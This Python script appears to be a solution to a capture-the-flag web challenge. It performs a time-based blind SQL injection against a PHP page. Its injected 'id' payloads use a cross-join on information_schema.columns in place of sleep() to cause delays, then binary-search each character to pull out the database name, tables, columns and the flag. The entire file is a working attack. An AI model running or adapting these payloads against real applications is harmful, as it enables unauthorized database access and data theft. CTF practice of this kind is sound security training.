
import time

import requests
from datetime import datetime

url = "http://web-1939c1eb66.challenge.xctf.org.cn/index.php"

result = ""
for i in range(1,100):
    head = 32
    tail = 126
    while head < tail:
        mid = (head + tail) >> 1
        #查数据库 ctf
        param = {
            "id": f"1' and ascii(substr(database(),{i},1))>{mid} and (select sum(0) from information_schema.columns A,information_schema.columns B)#"
        }
        #查表
        param = {
            "id": f"1' and ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{i},1))>{mid} and (select sum(0) from information_schema.columns A,information_schema.columns B)#"
        }
        #查列  Flagg
        param = {
            "id": f"1' and ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='Flllag')),{i},1))>{mid} and (select sum(0) from information_schema.columns A,information_schema.columns B)#"
        }
        #Flagg 查数据
        param = {
            "id": f"1' and ascii(substr((select(group_concat(concat_ws(0x7e,Flagg)))from(ctf.Flllag)),{i},1))>{mid} and (select sum(0) from information_schema.columns A,information_schema.columns B)#"
        }
        start = int(datetime.now().timestamp() * 1000)
        resp = requests.get(url, params=param)
        # print(resp.text)
        end = int(datetime.now().timestamp() * 1000)
        if end - start > 300:
            head = mid + 1
        else:
            tail = mid
    if head != 32:
        result += chr(head)
    else:
        break
    print(result)